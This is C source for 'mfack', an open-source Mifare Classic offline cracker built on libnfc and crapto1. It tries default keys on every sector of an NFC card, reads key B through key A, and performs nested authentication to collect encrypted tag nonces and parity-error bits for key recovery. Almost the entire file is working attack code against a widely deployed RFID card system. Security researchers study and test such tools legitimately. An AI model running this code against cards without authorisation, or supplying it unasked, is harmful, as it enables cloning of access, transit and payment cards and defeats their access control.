/*-
 * Mifare Classic Offline Cracker
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *
 * Contact: <mifare@nethemba.com>
 *
 * Porting to libnfc 1.3.3: Michal Boska <boska.michal@gmail.com>
 * Porting to libnfc 1.3.9 and upper: Romuald Conty <romuald@libnfc.org>
 *
 */

/*
 * This implementation was written based on information provided by the
 * following documents:
 *
 * http://eprint.iacr.org/2009/137.pdf
 * http://www.sos.cs.ru.nl/applications/rfid/2008-esorics.pdf
 * http://www.cosic.esat.kuleuven.be/rfidsec09/Papers/mifare_courtois_rfidsec09.pdf
 * http://www.cs.ru.nl/~petervr/papers/grvw_2009_pickpocket.pdf
 */

#define _XOPEN_SOURCE 1 // To enable getopt

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>

// NFC
#include <nfc/nfc.h>

// Crapto1
#include "crapto1.h"

// Internal
#include "config.h"
#include "mifare.h"
#include "nfc-utils.h"
#include "mfack.h"

//SLRE 
#include "slre.h"
#include "slre.c"

#define MAX_FRAME_LEN 264

static const nfc_modulation nm = {
.nmt = NMT_ISO14443A,
.nbr = NBR_106,
};

nfc_context *context;

uint64_t knownKey = 0;
char knownKeyLetter = 'A';
uint32_t knownSector = 0;
uint32_t unknownSector = 0;
char unknownKeyLetter = 'A';
uint32_t unexpected_random = 0;

int main(int argc, char *const argv[])
{
  int ch, i, k, n, j, m;
  int key, block;
  int succeed = 1;

  // Exploit sector
  int e_sector;

  // By default, dump 'A' keys
  int dumpKeysA = true;
  bool failure = false;
  bool skip = false;

  // Next default key specified as option (-k)
  uint8_t *defKeys = NULL, *p;
  size_t defKeys_len = 0;

  // Array with default Mifare Classic keys
  uint8_t defaultKeys[][6] = {
    {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // Default key (first key used by program if no user defined key)
    {0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5}, // NFCForum MAD key
    {0xd3, 0xf7, 0xd3, 0xf7, 0xd3, 0xf7}, // NFCForum content key
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Blank key
    {0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5},
    {0x4d, 0x3a, 0x99, 0xc3, 0x51, 0xdd},
    {0x1a, 0x98, 0x2c, 0x7e, 0x45, 0x9a},
    {0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff},
    {0x71, 0x4c, 0x5c, 0x88, 0x6e, 0x97},
    {0x58, 0x7e, 0xe5, 0xf9, 0x35, 0x0f},
    {0xa0, 0x47, 0x8c, 0xc3, 0x90, 0x91},
    {0x53, 0x3c, 0xb6, 0xc7, 0x23, 0xf6},
    {0x8f, 0xd0, 0xa4, 0xf2, 0x56, 0xe9}

  };

  mftag        t;
  mfreader    r;

  // Pointer to already broken keys, except defaults
  bKeys        *bk;

  static mifare_param mp, mtmp;
  static mifare_classic_tag mtDump;

  mifare_cmd mc;
  
  //File pointers for the keyfile 
  FILE * fp;
  char line[20];
  size_t len = 0;
  char * read;
  
  //Regexp declarations
  static const char *regex = "([0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f][0-9A-Fa-f])";
  struct slre_cap caps[2];  

  // Parse command line arguments
  while ((ch = getopt(argc, argv, "hD:s:BP:T:S:O:k:t:f:")) != -1) {
    switch (ch) {
      case 'f':
        if (!(fp = fopen(optarg, "r"))) {
                    fprintf(stderr, "Cannot open keyfile: %s, exiting\n", optarg);
                    exit(EXIT_FAILURE);
        }
        while ((read = fgets(line, sizeof(line), fp)) != NULL) {
            int i, j = 0, str_len = strlen(line);
            while (j < str_len &&
                   (i = slre_match(regex, line + j, str_len - j, caps, 500, 1)) > 0) {
                //We've found a key, let's add it to the structure.
                p = realloc(defKeys, defKeys_len + 6);
                if (!p) {
                  ERR("Cannot allocate memory for defKeys");
                  exit(EXIT_FAILURE);
                }                
                defKeys = p;
                memset(defKeys + defKeys_len, 0, 6);
                num_to_bytes(strtoll(caps[0].ptr, NULL, 16), 6, defKeys + defKeys_len);
                fprintf(stdout, "The custom key 0x%.*s has been added to the default keys\n", caps[0].len, caps[0].ptr);
                defKeys_len = defKeys_len + 6;
                
              j += i;
            }
        }
        break;      
      case 'k':
        // Add this key to the default keys
        p = realloc(defKeys, defKeys_len + 6);
        if (!p) {
          ERR("Cannot allocate memory for defKeys");
          exit(EXIT_FAILURE);
        }
        defKeys = p;
        memset(defKeys + defKeys_len, 0, 6);
        num_to_bytes(strtoll(optarg, NULL, 16), 6, defKeys + defKeys_len);
        fprintf(stdout, "The custom key 0x%012llx has been added to the default keys\n", bytes_to_num(defKeys + defKeys_len, 6));
        defKeys_len = defKeys_len + 6;

        break;
      case 'h':
        usage(stdout, 0);
        break;
      default:
        usage(stderr, 1);
        break;
    }
  }

  // Initialize reader/tag structures
  mf_init(&r);

  if (nfc_initiator_init(r.pdi) < 0) {
    nfc_perror(r.pdi, "nfc_initiator_init");
    goto error;
  }
  // Drop the field for a while, so can be reset
  if (nfc_device_set_property_bool(r.pdi, NP_ACTIVATE_FIELD, true) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool activate field");
    goto error;
  }
  // Let the reader only try once to find a tag
  if (nfc_device_set_property_bool(r.pdi, NP_INFINITE_SELECT, false) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool infinite select");
    goto error;
  }
  // Configure the CRC and Parity settings
  if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool crc");
    goto error;
  }
  if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool parity");
    goto error;
  }

  /*
      // wait for tag to appear
      for (i=0;!nfc_initiator_select_passive_target(r.pdi, nm, NULL, 0, &t.nt) && i < 10; i++) zsleep (100);
  */

  int tag_count;
  if ((tag_count = nfc_initiator_select_passive_target(r.pdi, nm, NULL, 0, &t.nt)) < 0) {
    nfc_perror(r.pdi, "nfc_initiator_select_passive_target");
    goto error;
  } else if (tag_count == 0) {
    ERR("No tag found.");
    goto error;
  }

  // Test if a compatible MIFARE tag is used
  if (((t.nt.nti.nai.btSak & 0x08) == 0) && (t.nt.nti.nai.btSak != 0x01)) {
    ERR("only Mifare Classic is supported");
    goto error;
  }

  t.authuid = (uint32_t) bytes_to_num(t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, 4);

  // Get Mifare Classic type from SAK
  // see http://www.nxp.com/documents/application_note/AN10833.pdf Section 3.2
  switch (t.nt.nti.nai.btSak)
  {
    case 0x01:
    case 0x08:
    case 0x88:
      if (get_rats_is_2k(t, r)) {
          printf("Found Mifare Plus 2k tag\n");
          t.num_sectors = NR_TRAILERS_2k;
          t.num_blocks = NR_BLOCKS_2k;
      } else {
        printf("Found Mifare Classic 1k tag\n");
        t.num_sectors = NR_TRAILERS_1k;
        t.num_blocks = NR_BLOCKS_1k;
      }
      break;
    case 0x09:
      printf("Found Mifare Classic Mini tag\n");
      t.num_sectors = NR_TRAILERS_MINI;
      t.num_blocks = NR_BLOCKS_MINI;
      break;
    case 0x18:
      printf("Found Mifare Classic 4k tag\n");
      t.num_sectors = NR_TRAILERS_4k;
      t.num_blocks = NR_BLOCKS_4k;
      break;
    default:
      ERR("Cannot determine card type from SAK");
      goto error;
  }

  t.sectors = (void *) calloc(t.num_sectors, sizeof(sector));
  if (t.sectors == NULL) {
    ERR("Cannot allocate memory for t.sectors");
    goto error;
  }
  if ((bk = (void *) malloc(sizeof(bKeys))) == NULL) {
    ERR("Cannot allocate memory for bk");
    goto error;
  } else {
    bk->brokenKeys = NULL;
    bk->size = 0;
  }

  // Initialize t.sectors, keys are not known yet
  for (uint8_t s = 0; s < (t.num_sectors); ++s) {
    t.sectors[s].foundKeyA = t.sectors[s].foundKeyB = false;
  }

  print_nfc_target(&t.nt, true);

  fprintf(stdout, "\nTry to authenticate to all sectors with default keys...\n");
  fprintf(stdout, "Symbols: '.' no key found, '/' A key found, '\\' B key found, 'x' both keys found\n");
  // Set the authentication information (uid)
  memcpy(mp.mpa.abtAuthUid, t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, sizeof(mp.mpa.abtAuthUid));
  // Iterate over all keys (n = number of keys)
  n = sizeof(defaultKeys) / sizeof(defaultKeys[0]);
  size_t defKey_bytes_todo = defKeys_len;
  key = 0;
  while (key < n || defKey_bytes_todo) {
    if (defKey_bytes_todo > 0) {
      memcpy(mp.mpa.abtKey, defKeys + defKeys_len - defKey_bytes_todo, sizeof(mp.mpa.abtKey));
      defKey_bytes_todo -= sizeof(mp.mpa.abtKey);
    } else {
      memcpy(mp.mpa.abtKey, defaultKeys[key], sizeof(mp.mpa.abtKey));
      key++;
    }
    fprintf(stdout, "[Key: %012llx] -> ", bytes_to_num(mp.mpa.abtKey, 6));
    fprintf(stdout, "[");
    i = 0; // Sector counter
    // Iterate over every block, where we haven't found a key yet
    for (block = 0; block <= t.num_blocks; ++block) {
      if (trailer_block(block)) {
        if (!t.sectors[i].foundKeyA) {
          mc = MC_AUTH_A;
          int res;
          if ((res = nfc_initiator_mifare_cmd(r.pdi, mc, block, &mp)) < 0) {
            if (res != NFC_EMFCAUTHFAIL) {
              nfc_perror(r.pdi, "nfc_initiator_mifare_cmd");
              goto error;
            }
            mf_anticollision(t, r);
          } else {
            // Save all information about successfull keyA authentization
            memcpy(t.sectors[i].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
            t.sectors[i].foundKeyA = true;
            // Although KeyA can never be directly read from the data sector, KeyB can, so
            // if we need KeyB for this sector, it should be revealed by a data read with KeyA
            // todo - check for duplicates in cracked key list (do we care? will not be huge overhead)
            // todo - make code more modular! :)
            if (!t.sectors[i].foundKeyB) {
              if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_READ, block, &mtmp)) >= 0) {
                // print only for debugging as it messes up output!
                //fprintf(stdout, "  Data read with Key A revealed Key B: [%012llx] - checking Auth: ", bytes_to_num(mtmp.mpd.abtData + 10, sizeof(mtmp.mpa.abtKey)));
                memcpy(mtmp.mpa.abtKey, mtmp.mpd.abtData + 10, sizeof(mtmp.mpa.abtKey));
                memcpy(mtmp.mpa.abtAuthUid, t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, sizeof(mtmp.mpa.abtAuthUid));
                if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_AUTH_B, block, &mtmp)) < 0) {
                  //fprintf(stdout, "Failed!\n");
                  mf_configure(r.pdi);
                  mf_anticollision(t, r);
                } else {
                  //fprintf(stdout, "OK\n");
                  memcpy(t.sectors[i].KeyB, mtmp.mpd.abtData + 10, sizeof(t.sectors[i].KeyB));
                  t.sectors[i].foundKeyB = true;
                  bk->size++;
                  bk->brokenKeys = (uint64_t *) realloc((void *)bk->brokenKeys, bk->size * sizeof(uint64_t));
                  bk->brokenKeys[bk->size - 1] = bytes_to_num(mtmp.mpa.abtKey, sizeof(mtmp.mpa.abtKey));
                }
              } else {
                  if (res != NFC_ERFTRANS) {
                    nfc_perror(r.pdi, "nfc_initiator_mifare_cmd");
                    goto error;
                  }
                mf_anticollision(t, r);
              }
            }
          }
        }
        // if key reveal failed, try other keys
        if (!t.sectors[i].foundKeyB) {
          mc = MC_AUTH_B;
          int res;
          if ((res = nfc_initiator_mifare_cmd(r.pdi, mc, block, &mp)) < 0) {
            if (res != NFC_EMFCAUTHFAIL) {
              nfc_perror(r.pdi, "nfc_initiator_mifare_cmd");
              goto error;
            }
            mf_anticollision(t, r);
            // No success, try next block
            t.sectors[i].trailer = block;
          } else {
            memcpy(t.sectors[i].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
            t.sectors[i].foundKeyB = true;
          }
        }
        if ((t.sectors[i].foundKeyA) && (t.sectors[i].foundKeyB)) {
          fprintf(stdout, "x");
        } else if (t.sectors[i].foundKeyA) {
          fprintf(stdout, "/");
        } else if (t.sectors[i].foundKeyB) {
          fprintf(stdout, "\\");
        } else {
          fprintf(stdout, ".");
        }
        fflush(stdout);
        // Save position of a trailer block to sector struct
        t.sectors[i++].trailer = block;
      }
    }
    fprintf(stdout, "]\n");
  }

  fprintf(stdout, "\n");
  for (i = 0; i < (t.num_sectors); ++i) {
    if(t.sectors[i].foundKeyA){
      fprintf(stdout, "Sector %02d - Found   Key A: %012llx ", i, bytes_to_num(t.sectors[i].KeyA, sizeof(t.sectors[i].KeyA)));
      memcpy(&knownKey, t.sectors[i].KeyA, 6);
      knownKeyLetter = 'A';
      knownSector = i;
    }
    else{
      fprintf(stdout, "Sector %02d - Unknown Key A               ", i);
      unknownSector = i;
      unknownKeyLetter = 'A';
    }
    if(t.sectors[i].foundKeyB){
      fprintf(stdout, "Found   Key B: %012llx\n", bytes_to_num(t.sectors[i].KeyB, sizeof(t.sectors[i].KeyB)));
      knownKeyLetter = 'B';
      memcpy(&knownKey, t.sectors[i].KeyB, 6);
      knownSector = i;
    }
    else{
      fprintf(stdout, "Unknown Key B\n");
      unknownSector = i;
      unknownKeyLetter = 'B';
    }
  }
  fflush(stdout);

  // Return the first (exploit) sector encrypted with the default key or -1 (we have all keys)
  e_sector = find_exploit_sector(t);

  fprintf(stdout, "Tag uid: %08x\n", t.authuid);

  // Recover key from encrypted sectors, j is a sector counter
  for (m = 0; m < 2; ++m) {
    if (e_sector == -1) break; // All keys are default, I am skipping recovery mode
    for (j = 0; j < (t.num_sectors); ++j) {
      memcpy(mp.mpa.abtAuthUid, t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, sizeof(mp.mpa.abtAuthUid));
      if ((dumpKeysA && !t.sectors[j].foundKeyA) || (!dumpKeysA && !t.sectors[j].foundKeyB)) {

        // First, try already broken keys
        skip = false;
        for (uint32_t o = 0; o < bk->size; o++) {
          num_to_bytes(bk->brokenKeys[o], 6, mp.mpa.abtKey);
          mc = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
          int res;
          if ((res = nfc_initiator_mifare_cmd(r.pdi, mc, t.sectors[j].trailer, &mp)) < 0) {
            if (res != NFC_EMFCAUTHFAIL) {
              nfc_perror(r.pdi, "nfc_initiator_mifare_cmd");
              goto error;
            }
            mf_anticollision(t, r);
          } else {
            // Save all information about successfull authentization
            printf("Sector: %d, type %c\n", j, (dumpKeysA ? 'A' : 'B'));
            if (dumpKeysA) {
              memcpy(t.sectors[j].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
              t.sectors[j].foundKeyA = true;
              // if we need KeyB for this sector it should be revealed by a data read with KeyA
              if (!t.sectors[j].foundKeyB) {
                if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_READ, t.sectors[j].trailer, &mtmp)) >= 0) {
                  fprintf(stdout, "  Data read with Key A revealed Key B: [%012llx] - checking Auth: ", bytes_to_num(mtmp.mpd.abtData + 10, sizeof(mtmp.mpa.abtKey)));
                  memcpy(mtmp.mpa.abtKey, mtmp.mpd.abtData + 10, sizeof(mtmp.mpa.abtKey));
                  memcpy(mtmp.mpa.abtAuthUid, t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4, sizeof(mtmp.mpa.abtAuthUid));
                  if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_AUTH_B, t.sectors[j].trailer, &mtmp)) < 0) {
                    fprintf(stdout, "Failed!\n");
                    mf_configure(r.pdi);
                    mf_anticollision(t, r);
                  } else {
                    fprintf(stdout, "OK\n");
                    memcpy(t.sectors[j].KeyB, mtmp.mpd.abtData + 10, sizeof(t.sectors[j].KeyB));
                    t.sectors[j].foundKeyB = true;
                    bk->size++;
                    bk->brokenKeys = (uint64_t *) realloc((void *)bk->brokenKeys, bk->size * sizeof(uint64_t));
                    bk->brokenKeys[bk->size - 1] = bytes_to_num(mtmp.mpa.abtKey, sizeof(mtmp.mpa.abtKey));
                  }
                } else {
                    if (res != NFC_ERFTRANS) {
                      nfc_perror(r.pdi, "nfc_initiator_mifare_cmd");
                      goto error;
                    }
                  mf_anticollision(t, r);
                }
              }
            } else {
              memcpy(t.sectors[j].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
              t.sectors[j].foundKeyB = true;
            }
            fprintf(stdout, "  Found Key: %c [%012llx]\n", (dumpKeysA ? 'A' : 'B'),
                    bytes_to_num(mp.mpa.abtKey, 6));
            mf_configure(r.pdi);
            mf_anticollision(t, r);
            skip = true;
            break;
          }
        }
        if (skip) continue; // We have already revealed key, go to the next iteration
        
        // AUTH + Recovery of a nonce
        uint32_t nonce = 0;
        uint8_t nonceParityError = 0;
        mf_enhanced_auth(e_sector, t.sectors[j].trailer, t, r, dumpKeysA, &nonce, &nonceParityError);
        mf_configure(r.pdi);
        mf_anticollision(t, r);

        // Display the nonce and the last 4 bit of the parity
        fprintf(stdout, "Sector: %d, type %c, nonce encoded: %08x, parity error: ", j, (dumpKeysA ? 'A' : 'B'), nonce);
        for (int iParity = 0; iParity < 4; iParity++) {
          fprintf(stdout, "%d", ((nonceParityError >> (3 - iParity)) & 0x01));
        }
        
        fprintf(stdout, "\n");
      }
    }
    dumpKeysA = false;
  }

  free(t.sectors);

  // Reset the "advanced" configuration to normal
  nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true);
  nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true);

  // Disconnect device and exit
  nfc_close(r.pdi);
  nfc_exit(context);
  exit(EXIT_SUCCESS);
error:
  nfc_close(r.pdi);
  nfc_exit(context);
  exit(EXIT_FAILURE);
}

void usage(FILE *stream, int errno)
{
  fprintf(stream, "Usage: mfack [-h] [-k key] [-f file] ...\n");
  fprintf(stream, "\n");
  fprintf(stream, "  h     print this help and exit\n");
  fprintf(stream, "  k     try the specified key in addition to the default keys\n");
  fprintf(stream, "  f     parses a file of keys to add in addition to the default keys \n");
  fprintf(stream, "\n");
  fprintf(stream, "Example: mfack\n");
  fprintf(stream, "Example: mfack -k ffffeeeedddd\n");
  fprintf(stream, "Example: mfack -f keys.txt\n");
  fprintf(stream, "\n");
  fprintf(stream, "This is mfack version %s.\n", PACKAGE_VERSION);
  fprintf(stream, "For more information, run: 'man mfack'.\n");
  exit(errno);
}

void mf_init(mfreader *r)
{
  // Connect to the first NFC device
  nfc_init(&context);
  if (context == NULL) {
    ERR("Unable to init libnfc (malloc)");
    exit(EXIT_FAILURE);
  }
  r->pdi = nfc_open(context, NULL);
  if (!r->pdi) {
    printf("No NFC device found.\n");
    exit(EXIT_FAILURE);
  }
}

void mf_configure(nfc_device *pdi)
{
  if (nfc_initiator_init(pdi) < 0) {
    nfc_perror(pdi, "nfc_initiator_init");
    exit(EXIT_FAILURE);
  }
  // Drop the field for a while, so can be reset
  if (nfc_device_set_property_bool(pdi, NP_ACTIVATE_FIELD, false) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool activate field");
    exit(EXIT_FAILURE);
  }
  // Let the reader only try once to find a tag
  if (nfc_device_set_property_bool(pdi, NP_INFINITE_SELECT, false) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool infinite select");
    exit(EXIT_FAILURE);
  }
  // Configure the CRC and Parity settings
  if (nfc_device_set_property_bool(pdi, NP_HANDLE_CRC, true) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool crc");
    exit(EXIT_FAILURE);
  }
  if (nfc_device_set_property_bool(pdi, NP_HANDLE_PARITY, true) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool parity");
    exit(EXIT_FAILURE);
  }
  // Enable the field so more power consuming cards can power themselves up
  if (nfc_device_set_property_bool(pdi, NP_ACTIVATE_FIELD, true) < 0) {
    nfc_perror(pdi, "nfc_device_set_property_bool activate field");
    exit(EXIT_FAILURE);
  }
}

void mf_select_tag(nfc_device *pdi, nfc_target *pnt)
{
  if (nfc_initiator_select_passive_target(pdi, nm, NULL, 0, pnt) < 0) {
    ERR("Unable to connect to the MIFARE Classic tag");
    nfc_close(pdi);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }
}

int trailer_block(uint32_t block)
{
  // Test if we are in the small or big sectors
  return (block < 128) ? ((block + 1) % 4 == 0) : ((block + 1) % 16 == 0);
}

// Return position of sector if it is encrypted with the default key otherwise exit..
int find_exploit_sector(mftag t)
{
  int i;
  bool interesting = false;

  for (i = 0; i < t.num_sectors; i++) {
    if (!t.sectors[i].foundKeyA || !t.sectors[i].foundKeyB) {
      interesting = true;
      break;
    }
  }
  if (!interesting) {
    fprintf(stdout, "\nWe have all sectors encrypted with the default keys..\n\n");
    return -1;
  }
  for (i = 0; i < t.num_sectors; i++) {
    if ((t.sectors[i].foundKeyA) || (t.sectors[i].foundKeyB)) {
      fprintf(stdout, "\n\nUsing sector %02d as an exploit sector\n", i);
      return i;
    }
  }
  ERR("\n\nNo sector encrypted with the default key has been found, exiting..");
  exit(EXIT_FAILURE);
}

void mf_anticollision(mftag t, mfreader r)
{
  if (nfc_initiator_select_passive_target(r.pdi, nm, NULL, 0, &t.nt) < 0) {
    nfc_perror(r.pdi, "nfc_initiator_select_passive_target");
    ERR("Tag has been removed");
    exit(EXIT_FAILURE);
  }
}


bool
get_rats_is_2k(mftag t, mfreader r)
{
  int res;
  uint8_t abtRx[MAX_FRAME_LEN];
  int szRxBits;
  uint8_t  abtRats[2] = { 0xe0, 0x50};
  // Use raw send/receive methods
  if (nfc_device_set_property_bool(r.pdi, NP_EASY_FRAMING, false) < 0) {
    nfc_perror(r.pdi, "nfc_configure");
    return false;
  }
  res = nfc_initiator_transceive_bytes(r.pdi, abtRats, sizeof(abtRats), abtRx, sizeof(abtRx), 0);
  if (res > 0) {
    // ISO14443-4 card, turn RF field off/on to access ISO14443-3 again
    if (nfc_device_set_property_bool(r.pdi, NP_ACTIVATE_FIELD, false) < 0) {
      nfc_perror(r.pdi, "nfc_configure");
      return false;
    }
    if (nfc_device_set_property_bool(r.pdi, NP_ACTIVATE_FIELD, true) < 0) {
      nfc_perror(r.pdi, "nfc_configure");
      return false;
    }
  }
  // Reselect tag
  if (nfc_initiator_select_passive_target(r.pdi, nm, NULL, 0, &t.nt) <= 0) {
    printf("Error: tag disappeared\n");
    nfc_close(r.pdi);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }
  if (res >= 10) {
    printf("ATS %02X%02X%02X%02X%02X|%02X%02X%02X%02X%02X\n", res, abtRx[0], abtRx[1], abtRx[2], abtRx[3], abtRx[4], abtRx[5], abtRx[6], abtRx[7], abtRx[8]);
    return ((abtRx[5] == 0xc1) && (abtRx[6] == 0x05)
            && (abtRx[7] == 0x2f) && (abtRx[8] == 0x2f)
            && ((t.nt.nti.nai.abtAtqa[1] & 0x02) == 0x00));
  } else {
    return false;
  }
}

int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, bool dumpKeysA, uint32_t* nonce, uint8_t* nonceParityError)
{
  struct Crypto1State *pcs;

  uint8_t Nr[4] = { 0x00, 0x00, 0x00, 0x00 }; // Reader nonce
  uint8_t Auth[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
  uint8_t AuthEnc[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
  uint8_t AuthEncPar[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

  uint8_t ArEnc[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint8_t ArEncPar[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

  uint8_t Rx[MAX_FRAME_LEN]; // Tag response
  uint8_t RxPar[MAX_FRAME_LEN]; // Tag response

  uint32_t Nt, NtLast, NtProbe, NtEnc, Ks1;

  int i;
  uint32_t m;

  // Prepare AUTH command
  Auth[0] = (t.sectors[e_sector].foundKeyA) ? MC_AUTH_A : MC_AUTH_B;
  iso14443a_crc_append(Auth, 2);
  // fprintf(stdout, "\nAuth command:\t");
  // print_hex(Auth, 4);

  // We need full control over the CRC
  if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, false) < 0)  {
    nfc_perror(r.pdi, "nfc_device_set_property_bool crc");
    exit(EXIT_FAILURE);
  }

  // Request plain tag-nonce
  // TODO: Set NP_EASY_FRAMING option only once if possible
  if (nfc_device_set_property_bool(r.pdi, NP_EASY_FRAMING, false) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool framing");
    exit(EXIT_FAILURE);
  }

  if (nfc_initiator_transceive_bytes(r.pdi, Auth, 4, Rx, sizeof(Rx), 0) < 0) {
    fprintf(stdout, "Error while requesting plain tag-nonce\n");
    exit(EXIT_FAILURE);
  }

  if (nfc_device_set_property_bool(r.pdi, NP_EASY_FRAMING, true) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool");
    exit(EXIT_FAILURE);
  }
  // print_hex(Rx, 4);

  // Save the tag nonce (Nt)
  Nt = bytes_to_num(Rx, 4);

  // Init the cipher with key {0..47} bits
  if (t.sectors[e_sector].foundKeyA) {
    pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyA, 6));
  } else {
    pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));
  }

  // Load (plain) uid^nt into the cipher {48..79} bits
  crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.authuid, 0);

  // Generate (encrypted) nr+parity by loading it into the cipher
  for (i = 0; i < 4; i++) {
    // Load in, and encrypt the reader nonce (Nr)
    ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
    ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
  }
  // Skip 32 bits in the pseudo random generator
  Nt = prng_successor(Nt, 32);
  // Generate reader-answer from tag-nonce
  for (i = 4; i < 8; i++) {
    // Get the next random byte
    Nt = prng_successor(Nt, 8);
    // Encrypt the reader-answer (Nt' = suc2(Nt))
    ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^(Nt & 0xff);
    ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
  }

  // Finally we want to send arbitrary parity bits
  if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, false) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool parity");
    exit(EXIT_FAILURE);
  }

  // Transmit reader-answer
  // fprintf(stdout, "\t{Ar}:\t");
  // print_hex_par(ArEnc, 64, ArEncPar);
  int res;
  if (((res = nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, sizeof(Rx), RxPar)) < 0) || (res != 32)) {
    ERR("Reader-answer transfer error, exiting..");
    exit(EXIT_FAILURE);
  }

  // Now print the answer from the tag
  // fprintf(stdout, "\t{At}:\t");
  // print_hex_par(Rx,RxLen,RxPar);

  // Decrypt the tag answer and verify that suc3(Nt) is At
  Nt = prng_successor(Nt, 32);
  if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt & 0xFFFFFFFF))) {
    ERR("[At] is not Suc3(Nt), something is wrong, exiting..");
    exit(EXIT_FAILURE);
  }
  // fprintf(stdout, "Authentication completed.\n\n");

  // Again, prepare the Auth command with MC_AUTH_A, recover the block and CRC
  Auth[0] = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
  Auth[1] = a_sector;
  iso14443a_crc_append(Auth, 2);

  // Encryption of the Auth command, sending the Auth command
  for (i = 0; i < 4; i++) {
    AuthEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ Auth[i];
    // Encrypt the parity bits with the 4 plaintext bytes
    AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
  }
  if (nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar, Rx, sizeof(Rx), RxPar) < 0) {
    ERR("while requesting encrypted tag-nonce");
    exit(EXIT_FAILURE);
  }

  // Finally we want to send arbitrary parity bits
  if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true) < 0)  {
    nfc_perror(r.pdi, "nfc_device_set_property_bool parity restore M");
    exit(EXIT_FAILURE);
  }

  if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true) < 0)  {
    nfc_perror(r.pdi, "nfc_device_set_property_bool crc restore M");
    exit(EXIT_FAILURE);
  }

  // Save the encrypted nonce
  *nonce = bytes_to_num(Rx, 4);
  *nonceParityError = 0;

  // Extract the parity bits and get the errors with the parity of encrypted message
  for (i = 0; i < 4; i++) {
    *nonceParityError = *nonceParityError | ((RxPar[i] ^ oddparity(Rx[i])) << (3 - i));
  }

  crypto1_destroy(pcs);
  return 0;
}

void num_to_bytes(uint64_t n, uint32_t len, uint8_t *dest)
{
  while (len--) {
    dest[len] = (uint8_t) n;
    n >>= 8;
  }
}

long long unsigned int bytes_to_num(uint8_t *src, uint32_t len)
{
  uint64_t num = 0;
  while (len--) {
    num = (num << 8) | (*src);
    src++;
  }
  return num;
}
